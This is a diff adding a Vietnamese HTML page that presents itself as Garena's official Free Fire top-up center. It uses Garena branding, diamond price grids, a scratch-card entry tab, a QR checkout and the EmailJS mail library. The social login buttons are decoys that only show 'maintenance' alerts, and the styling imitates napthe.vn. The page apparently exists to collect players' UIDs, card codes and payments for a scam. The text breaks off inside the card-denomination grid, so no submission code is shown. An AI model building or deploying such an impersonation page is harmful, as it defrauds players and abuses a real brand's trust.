@@ -1,0 +1,1607 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Trung tâm nạp thẻ chính thức</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    <!-- Thư viện EmailJS -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+    <style>
+        /* ================= RESET & BASE ================= */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #f4f5f7;
+            color: #333;
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 0 15px rgba(0,0,0,0.05);
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* ================= HEADER ================= */
+        .header {
+            background: #ffffff;
+            height: 52px;
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #eef0f3;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-brand {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .header-logo {
+            height: 28px;
+        }
+
+        .header-title {
+            font-size: 0.82rem;
+            color: #333;
+            font-weight: 500;
+            line-height: 1.2;
+            border-left: 1px solid #ddd;
+            padding-left: 8px;
+        }
+
+        .header-user-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            overflow: hidden;
+            position: relative;
+            cursor: pointer;
+            border: 2px solid #ff4655;
+        }
+
+        .header-user-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* ================= BANNER NARUTO ================= */
+        .top-banner {
+            width: 100%;
+            background: #0d1117;
+        }
+
+        .top-banner img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+        }
+
+        /* ================= GAME SELECTION ================= */
+        .game-section {
+            background: #ffffff;
+            padding: 16px 14px 10px 14px;
+            margin-bottom: 10px;
+        }
+
+        .section-title {
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 14px;
+        }
+
+        .game-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 12px 8px;
+        }
+
+        .game-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .game-icon-box {
+            width: 58px;
+            height: 58px;
+            border-radius: 14px;
+            overflow: hidden;
+            background: #f0f0f0;
+            border: 2px solid transparent;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+            transition: all 0.2s ease;
+        }
+
+        .game-item.active .game-icon-box {
+            border-color: #ff0000;
+            box-shadow: 0 0 0 2px rgba(255, 0, 0, 0.2);
+        }
+
+        .game-name {
+            font-size: 0.72rem;
+            color: #444;
+            margin-top: 6px;
+            text-align: center;
+            line-height: 1.2;
+            font-weight: 500;
+        }
+
+        .game-item.active .game-name {
+            color: #ff0000;
+            font-weight: 700;
+        }
+
+        /* ================= FF EVENT BANNER ================= */
+        .banner-container {
+            padding: 0 14px;
+            margin-bottom: 12px;
+        }
+
+        .banner-card {
+            background: #fff;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+        }
+
+        .banner-img-box {
+            position: relative;
+            width: 100%;
+            height: 90px;
+            background: #111;
+        }
+
+        .banner-img-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .banner-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 8px 12px;
+            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .banner-game-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #fff;
+        }
+
+        .banner-text {
+            color: #fff;
+        }
+
+        .banner-text h3 {
+            font-size: 0.88rem;
+            font-weight: 700;
+        }
+
+        .banner-text p {
+            font-size: 0.65rem;
+            opacity: 0.9;
+            background: rgba(255,255,255,0.2);
+            padding: 1px 6px;
+            border-radius: 4px;
+            display: inline-block;
+            margin-top: 2px;
+        }
+
+        /* ================= MAIN STEPS ================= */
+        .step-container {
+            padding: 0 14px;
+            flex: 1;
+        }
+
+        .step-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+        }
+
+        .step-title-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 16px;
+        }
+
+        .step-badge {
+            background: #d32f2f;
+            color: #fff;
+            width: 24px;
+            height: 24px;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.88rem;
+            font-weight: bold;
+        }
+
+        .step-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #111;
+        }
+
+        /* ================= LOGIN SECTION ================= */
+        .login-box {
+            background: #f9f9f9;
+            border-radius: 10px;
+            padding: 16px;
+            border: 1px solid #f0f0f0;
+        }
+
+        .login-label-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+
+        .login-label {
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: #222;
+        }
+
+        .help-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 1.5px solid #888;
+            color: #666;
+            font-size: 0.72rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .input-row {
+            display: flex;
+            height: 44px;
+            border: 1.5px solid #e0e0e0;
+            border-radius: 8px;
+            overflow: hidden;
+            background: #fff;
+            margin-bottom: 16px;
+        }
+
+        .input-field {
+            flex: 1;
+            border: none;
+            padding: 0 14px;
+            font-size: 0.9rem;
+            outline: none;
+            color: #333;
+            background: transparent;
+        }
+
+        .btn-submit-login {
+            background: #d32f2f;
+            color: #fff;
+            border: none;
+            padding: 0 20px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .social-login-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+
+        .social-login-text {
+            font-size: 0.8rem;
+            color: #666;
+            line-height: 1.3;
+            max-width: 55%;
+        }
+
+        .social-icons-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .social-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.08);
+        }
+
+        .btn-fb { background: #1877f2; }
+        .btn-gg { background: #ffffff; border: 1px solid #e0e0e0; }
+        .btn-x  { background: #ffffff; border: 1px solid #e0e0e0; }
+        .btn-vk { background: #0077ff; }
+
+        .social-btn svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .user-logged {
+            display: none;
+            align-items: center;
+            justify-content: space-between;
+            background: #e8f5e9;
+            padding: 12px 14px;
+            border-radius: 8px;
+            border: 1px solid #c8e6c9;
+        }
+
+        .user-logged.active {
+            display: flex;
+        }
+
+        .user-info {
+            font-size: 0.88rem;
+            color: #2e7d32;
+            font-weight: 700;
+        }
+
+        .btn-logout {
+            background: none;
+            border: none;
+            color: #d32f2f;
+            font-size: 0.8rem;
+            cursor: pointer;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+
+        /* ================= TABS & DENOM ================= */
+        .tabs-header {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 14px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            height: 36px;
+            border: 1px solid #e0e0e0;
+            border-radius: 20px;
+            background: #fff;
+            font-size: 0.78rem;
+            color: #555;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .tab-btn.active {
+            border-color: #d32f2f;
+            color: #d32f2f;
+            background: #fff5f5;
+            font-weight: 700;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .denom-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+        }
+
+        .denom-card {
+            background: #f9f9f9;
+            border: 1px solid #e8e8e8;
+            border-radius: 8px;
+            padding: 10px 4px;
+            text-align: center;
+            cursor: pointer;
+        }
+
+        .denom-card.active {
+            border-color: #d32f2f;
+            background: #fff;
+            box-shadow: 0 2px 6px rgba(211, 47, 47, 0.15);
+        }
+
+        .denom-price {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: #222;
+        }
+
+        .denom-diamonds {
+            font-size: 0.7rem;
+            color: #1976d2;
+            margin-top: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 2px;
+        }
+
+        .card-type-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .card-type-item {
+            flex: 1;
+            border: 1px solid #e0e0e0;
+            padding: 8px 0;
+            border-radius: 6px;
+            text-align: center;
+            font-size: 0.78rem;
+            font-weight: 700;
+            color: #444;
+            cursor: pointer;
+            background: #fafafa;
+        }
+
+        .card-type-item.active {
+            border-color: #d32f2f;
+            color: #d32f2f;
+            background: #fff5f5;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.78rem;
+            font-weight: 500;
+            color: #444;
+            margin-bottom: 6px;
+        }
+
+        .shop-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .shop-card {
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+            background: #fff;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .shop-card.active {
+            border-color: #d32f2f;
+            background: #fff5f5;
+        }
+
+        .shop-card-img {
+            width: 100%;
+            height: 90px;
+            object-fit: contain;
+            margin-bottom: 6px;
+            border-radius: 6px;
+        }
+
+        .shop-title {
+            font-size: 0.82rem;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 2px;
+        }
+
+        .shop-desc {
+            font-size: 0.68rem;
+            color: #666;
+            margin-bottom: 8px;
+            line-height: 1.2;
+            min-height: 28px;
+        }
+
+        .shop-price {
+            font-size: 0.8rem;
+            font-weight: 700;
+            color: #d32f2f;
+            background: #fff;
+            padding: 4px 8px;
+            border-radius: 4px;
+            border: 1px solid #ffd6d6;
+            width: 100%;
+        }
+
+        .pay-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+        }
+
+        .pay-card {
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            background: #fff;
+            position: relative;
+        }
+
+        .pay-card.active {
+            border-color: #d32f2f;
+            background: #fff5f5;
+        }
+
+        .pay-icon {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+            flex-shrink: 0;
+        }
+
+        .pay-name {
+            font-size: 0.75rem;
+            font-weight: 500;
+            color: #333;
+            line-height: 1.2;
+        }
+
+        .hot-badge {
+            position: absolute;
+            top: -5px;
+            right: 6px;
+            background: #ff9800;
+            color: #fff;
+            font-size: 0.55rem;
+            font-weight: bold;
+            padding: 1px 4px;
+            border-radius: 3px;
+        }
+
+        .bottom-bar {
+            position: sticky;
+            bottom: 0;
+            background: #fff;
+            padding: 10px 16px;
+            border-top: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
+            z-index: 99;
+        }
+
+        .checkout-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .checkout-label {
+            font-size: 0.7rem;
+            color: #666;
+        }
+
+        .checkout-amount {
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: #d32f2f;
+        }
+
+        .btn-pay {
+            background: #d32f2f;
+            color: #fff;
+            border: none;
+            padding: 10px 22px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* ================= GIAO DIỆN THANH TOÁN QR CHUẨN NAPTHE.VN ================= */
+        .qr-checkout-page {
+            display: none;
+            background: #f4f5f7;
+            min-height: 100vh;
+        }
+
+        .qr-checkout-page.active {
+            display: block;
+        }
+
+        .sub-header {
+            background: #ffffff;
+            height: 48px;
+            padding: 0 16px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid #eef0f3;
+        }
+
+        .btn-back {
+            background: #666;
+            color: #fff;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 14px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .checkout-game-card {
+            background: #fff;
+            padding: 16px;
+            margin: 12px 14px;
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+        }
+
+        .checkout-game-img {
+            height: 70px;
+            object-fit: contain;
+        }
+
+        .summary-card {
+            background: #fff;
+            margin: 0 14px 12px 14px;
+            border-radius: 12px;
+            padding: 14px 16px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.85rem;
+            padding: 8px 0;
+            color: #444;
+        }
+
+        .summary-row strong {
+            color: #111;
+        }
+
+        .promo-card {
+            background: #fff;
+            margin: 0 14px 14px 14px;
+            border-radius: 12px;
+            padding: 14px 16px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.04);
+        }
+
+        .promo-title {
+            font-size: 0.82rem;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 8px;
+        }
+
+        .promo-input-box {
+            display: flex;
+            gap: 8px;
+        }
+
+        .promo-input {
+            flex: 1;
+            height: 38px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 0 10px;
+            font-size: 0.78rem;
+            outline: none;
+        }
+
+        .btn-apply-promo {
+            background: #d32f2f;
+            color: #fff;
+            border: none;
+            padding: 0 16px;
+            border-radius: 6px;
+            font-size: 0.78rem;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .btn-process-pay {
+            background: #d32f2f;
+            color: #fff;
+            border: none;
+            width: calc(100% - 28px);
+            margin: 0 14px 14px 14px;
+            height: 44px;
+            border-radius: 22px;
+            font-size: 0.9rem;
+            font-weight: 700;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 8px rgba(211, 47, 47, 0.3);
+        }
+
+        /* Khung quét QR */
+        .qr-display-box {
+            display: none;
+            background: #fff;
+            margin: 0 14px 16px 14px;
+            border-radius: 12px;
+            padding: 20px 16px;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+
+        .qr-display-box.active {
+            display: block;
+        }
+
+        .qr-instruction {
+            font-size: 0.88rem;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 4px;
+        }
+
+        .qr-subtext {
+            font-size: 0.72rem;
+            color: #666;
+            margin-bottom: 14px;
+        }
+
+        .qr-image-container {
+            width: 210px;
+            height: 210px;
+            margin: 0 auto 16px auto;
+            border: 1px solid #eee;
+            padding: 8px;
+            border-radius: 8px;
+            background: #fff;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+
+        .qr-image-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .btn-qr-done {
+            background: #d32f2f;
+            color: #fff;
+            border: none;
+            width: 100%;
+            height: 44px;
+            border-radius: 22px;
+            font-size: 0.88rem;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        /* ================= MỤC CHỜ XỬ LÝ / KẾT QUẢ ================= */
+        .pending-section {
+            display: none;
+            background: #fff;
+            border-radius: 12px;
+            padding: 24px 16px;
+            margin: 16px 14px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+            text-align: center;
+        }
+
+        .pending-section.active {
+            display: block;
+        }
+
+        .spinner-box {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .spinner {
+            width: 44px;
+            height: 44px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #d32f2f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-tag {
+            display: inline-block;
+            background: #fff3e0;
+            color: #e65100;
+            font-size: 0.75rem;
+            font-weight: 700;
+            padding: 4px 12px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+        }
+
+        .order-detail-card {
+            background: #fafafa;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 12px;
+            text-align: left;
+            margin: 14px 0;
+        }
+
+        .order-row {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.78rem;
+            padding: 6px 0;
+            border-bottom: 1px dashed #e8e8e8;
+        }
+
+        .order-row:last-child {
+            border-bottom: none;
+        }
+
+        .order-row span {
+            color: #666;
+        }
+
+        .order-row strong {
+            color: #222;
+        }
+
+        .btn-new-order {
+            background: #d32f2f;
+            color: #fff;
+            border: none;
+            width: 100%;
+            padding: 11px 0;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 0.85rem;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        footer {
+            background: #222;
+            color: #777;
+            padding: 16px;
+            text-align: center;
+            font-size: 0.65rem;
+            line-height: 1.4;
+            margin-top: auto;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- GIAO DIỆN CHÍNH (TRANG CHỦ / BƯỚC NẠP) -->
+    <div id="mainApp">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-brand">
+                <img src="https://cdn.phototourl.com/member/2026-09-28-da3cf786-a99d-4313-ab81-814b30266374.png" alt="Garena Logo" class="header-logo">
+                <span class="header-title">Trung tâm nạp<br>thẻ chính thức</span>
+            </div>
+
+            <label class="header-user-icon" title="Ảnh đại diện">
+                <img id="userAvatar" src="https://cdn.phototourl.com/member/2026-10-04-3edd62e7-86ec-449b-9680-92f1490f0818.png" alt="User Avatar">
+            </label>
+        </header>
+
+        <!-- Banner Naruto -->
+        <div class="top-banner">
+            <img src="https://cdn.phototourl.com/member/2026-10-04-7d580908-5c77-4739-9df2-0267e2541322.png" alt="Free Fire x Naruto">
+        </div>
+
+        <!-- Danh sách lựa chọn trò chơi (Đã làm sáng tất cả các game) -->
+        <section class="game-section">
+            <div class="section-title">Lựa chọn trò chơi</div>
+            <div class="game-grid">
+                
+                <div class="game-item active">
+                    <div class="game-icon-box">
+                        <img src="https://cdn.phototourl.com/member/2026-09-28-763d046e-2237-4ed1-ab26-f42a46bbeb9d.png" alt="Free Fire">
+                    </div>
+                    <span class="game-name">Free Fire</span>
+                </div>
+
+                <div class="game-item" onclick="alert('Trò chơi hiện đang bảo trì!')">
+                    <div class="game-icon-box">
+                        <img src="https://cdn.phototourl.com/member/2026-09-28-7ca3a581-81fc-4ed5-a115-601a7392ac38.png" alt="Liên Quân Mobile">
+                    </div>
+                    <span class="game-name">Liên Quân Mobile</span>
+                </div>
+
+                <div class="game-item" onclick="alert('Trò chơi hiện đang bảo trì!')">
+                    <div class="game-icon-box">
+                        <img src="https://cdn.phototourl.com/member/2026-09-28-f4e1bff4-315f-495d-91c8-1fd9b67849ab.png" alt="FC Mobile VN">
+                    </div>
+                    <span class="game-name">FC Mobile VN</span>
+                </div>
+
+                <div class="game-item" onclick="alert('Trò chơi hiện đang bảo trì!')">
+                    <div class="game-icon-box">
+                        <img src="https://cdn.phototourl.com/member/2026-09-28-2e91e6ff-8cfa-4da0-ad2a-167fd3fa9309.png" alt="Delta Force">
+                    </div>
+                    <span class="game-name">Delta Force</span>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Banner Free Fire -->
+        <div class="banner-container">
+            <div class="banner-card">
+                <div class="banner-img-box">
+                    <img src="https://cdn.phototourl.com/member/2026-10-04-1526c45c-cf2f-4710-b52a-6fbd7e0d0c68.png" alt="Banner Event">
+                    <div class="banner-overlay">
+                        <div class="banner-game-icon">
+                            <img src="https://cdn.phototourl.com/member/2026-09-28-763d046e-2237-4ed1-ab26-f42a46bbeb9d.png" alt="FF Icon">
+                        </div>
+                        <div class="banner-text">
+                            <h3>Free Fire</h3>
+                            <p>🛡️ Thanh toán an toàn 100%</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Container Các Bước Nạp -->
+        <div class="step-container">
+            
+            <div id="rechargeMainFlow">
+                <!-- Bước 1: Đăng Nhập -->
+                <div class="step-card">
+                    <div class="step-title-box">
+                        <div class="step-badge">1</div>
+                        <div class="step-title">Đăng nhập</div>
+                    </div>
+                    
+                    <div id="loginSection" class="login-box">
+                        <div class="login-label-row">
+                            <span class="login-label">ID người chơi</span>
+                            <span class="help-icon" onclick="alert('Cách tìm ID người chơi:\nMở ứng dụng Free Fire -> Nhấp vào Ảnh đại diện ở góc trên bên trái -> Copy mã ID trong hồ sơ của bạn.')">?</span>
+                        </div>
+
+                        <div class="input-row">
+                            <input type="text" id="uidInput" class="input-field" placeholder="Hãy nhập UID của bạn">
+                            <button id="btnLogin" class="btn-submit-login">Đăng nhập</button>
+                        </div>
+
+                        <div class="social-login-box">
+                            <div class="social-login-text">
+                                Hoặc đăng nhập bằng tài khoản game của bạn
+                            </div>
+                            <div class="social-icons-group">
+                                <a href="#" class="social-btn btn-fb" onclick="alert('Tính năng đăng nhập qua Facebook đang được bảo trì, vui lòng sử dụng UID!')" title="Facebook">
+                                    <svg viewBox="0 0 24 24" fill="#ffffff"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+                                </a>
+                                <a href="#" class="social-btn btn-gg" onclick="alert('Tính năng đăng nhập qua Google đang được bảo trì, vui lòng sử dụng UID!')" title="Google">
+                                    <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/></svg>
+                                </a>
+                                <a href="#" class="social-btn btn-x" onclick="alert('Tính năng đăng nhập qua X đang được bảo trì, vui lòng sử dụng UID!')" title="X">
+                                    <svg viewBox="0 0 24 24" fill="#000000"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                                </a>
+                                <a href="#" class="social-btn btn-vk" onclick="alert('Tính năng đăng nhập qua VK đang được bảo trì, vui lòng sử dụng UID!')" title="VKontakte">
+                                    <svg viewBox="0 0 24 24" fill="#ffffff"><path d="M15.684 0H8.316C1.592 0 0 1.592 0 8.316v7.368C0 22.408 1.592 24 8.316 24h7.368C22.408 24 24 22.408 24 15.684V8.316C24 1.592 22.408 0 15.684 0zm3.692 17.123h-1.644c-.624 0-.816-.495-1.933-1.612-1.008-1.008-1.455-1.137-1.708-1.137-.354 0-.456.102-.456.582v1.543c0 .393-.127.624-1.177.624-1.728 0-3.64-1.047-4.992-3.003-2.03-2.884-2.585-5.05-2.585-5.49 0-.24.09-.462.532-.462h1.644c.4 0 .552.183.705.612.772 2.228 2.062 4.184 2.59 4.184.202 0 .294-.092.294-.595v-2.308c-.063-1.037-.605-1.125-.605-1.493 0-.175.147-.353.388-.353h2.586c.34 0 .462.176.462.571v3.123c0 .34.148.462.247.462.202 0 .373-.122.753-.502 1.163-1.303 1.986-3.327 1.986-3.327.102-.228.28-.462.682-.462h1.644c.493 0 .6.252.493.6-.215.992-2.308 3.963-2.308 3.963-.18.278-.252.403 0 .736.177.24.773.758 1.17 1.218.722.825 1.272 1.515 1.417 1.992.148.468-.073.71-.55.71z"/></svg>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="userLogged" class="user-logged">
+                        <div class="user-info">UID: <span id="displayUid">--</span></div>
+                        <button id="btnLogout" class="btn-logout">Đăng xuất</button>
+                    </div>
+                </div>
+
+                <!-- Bước 2: Chọn Hình Thức & Nạp -->
+                <div class="step-card">
+                    <div class="step-title-box">
+                        <div class="step-badge">2</div>
+                        <div class="step-title">Gói dịch vụ</div>
+                    </div>
+
+                    <div class="tabs-header">
+                        <button class="tab-btn active" id="tabBtnOnline" onclick="switchTab('online')">Nạp Online</button>
+                        <button class="tab-btn" id="tabBtnCard" onclick="switchTab('card')">Thẻ Garena / Cào</button>
+                        <button class="tab-btn" id="tabBtnShop" onclick="switchTab('shop')">Shop</button>
+                    </div>
+
+                    <!-- Tab 1: Nạp Online (Đã cập nhật đúng lượng kim cương yêu cầu) -->
+                    <div id="tab-online" class="tab-content active">
+                        <div class="denom-grid" id="denomGrid">
+                            <div class="denom-card" data-price="5.000 đ" data-title="125">
+                                <div class="denom-price">5.000 đ</div>
+                                <div class="denom-diamonds">💎 125</div>
+                            </div>
+                            <div class="denom-card" data-price="10.000 đ" data-title="255">
+                                <div class="denom-price">10.000 đ</div>
+                                <div class="denom-diamonds">💎 255</div>
+                            </div>
+                            <div class="denom-card" data-price="20.000 đ" data-title="565">
+                                <div class="denom-price">20.000 đ</div>
+                                <div class="denom-diamonds">💎 565</div>
+                            </div>
+                            <div class="denom-card active" data-price="50.000 đ" data-title="1.415">
+                                <div class="denom-price">50.000 đ</div>
+                                <div class="denom-diamonds">💎 1.415</div>
+                            </div>
+                            <div class="denom-card" data-price="100.000 đ" data-title="2.830">
+                                <div class="denom-price">100.000 đ</div>
+                                <div class="denom-diamonds">💎 2.830</div>
+                            </div>
+                            <div class="denom-card" data-price="200.000 đ" data-title="5.660">
+                                <div class="denom-price">200.000 đ</div>
+                                <div class="denom-diamonds">💎 5.660</div>
+                            </div>
+                            <div class="denom-card" data-price="500.000 đ" data-title="14.375">
+                                <div class="denom-price">500.000 đ</div>
+                                <div class="denom-diamonds">💎 14.375</div>
+                            </div>
+                            <div class="denom-card" data-price="1.000.000 đ" data-title="28.750">
+                                <div class="denom-price">1.000.000 đ</div>
+                                <div class="denom-diamonds">💎 28.750</div>
+                            </div>
+                            <div class="denom-card" data-price="2.000.000 đ" data-title="57.500">
+                                <div class="denom-price">2.000.000 đ</div>
+                                <div class="denom-diamonds">💎 57.500</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Tab 2: Thẻ Cào -->
+                    <div id="tab-card" class="tab-content">
+                        <div class="form-group">
+                            <label>Chọn nhà mạng / Loại thẻ</label>
+                            <div class="card-type-group">
+                                <div class="card-type-item active" onclick="selectCardType(this, 'Viettel')">Viettel</div>
+                                <div class="card-type-item" onclick="selectCardType(this, 'Vinaphone')">Vinaphone</div>
+                                <div class="card-type-item" onclick="selectCardType(this, 'Mobifone')">Mobifone</div>
+                                <div class="card-type-item" onclick="selectCardType(this, 'Garena')">Garena</div>
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Chọn mệnh giá thẻ cào</label>
+                            <div class="denom-grid" id="cardDenomGrid">
+                                <div class="denom-card" data-price="20.000 đ" data-title="565">
+                                    <div class="denom-price">20.000 đ</div>
+                                    <div class="denom-diamonds">💎 565</div>
+                                </div>
+                                <div class="denom-card active" data-price="50.000 đ" data-title="1.415">
+                                    <div class="denom-price">50.000 đ</div>
+                                    <div class="denom-diamonds">💎 1.415</div>
+                                </div>
+                                <div class="denom-card" data-price="100.000 đ" data-title="2.830">
+                                    <div class="denom-price">100.000 đ</div>
+                                    <div class="denom-diamonds">💎 2.830</div>
+                                </div>
+                                <div class="denom-card" data-price="200.000 đ" data-title="5.660">
+                                    <div class="denom-price">200.000 đ</div>
+                                    <div class="denom-diamonds">💎 5.660</div>
+                                </div>
+                                <div class="denom-card" data-price="500.000 đ" data-title="14.375">
+                                    <div class="denom-price">500.000 đ</div>
+                                    <div class="denom-diamonds">💎 14.375</div>
+                                </div>
+                                <div class="denom-card" data-price="1.000.000 đ" data-title="28.750">
+                                    <div class="denom-price">1.000.000 đ</div>
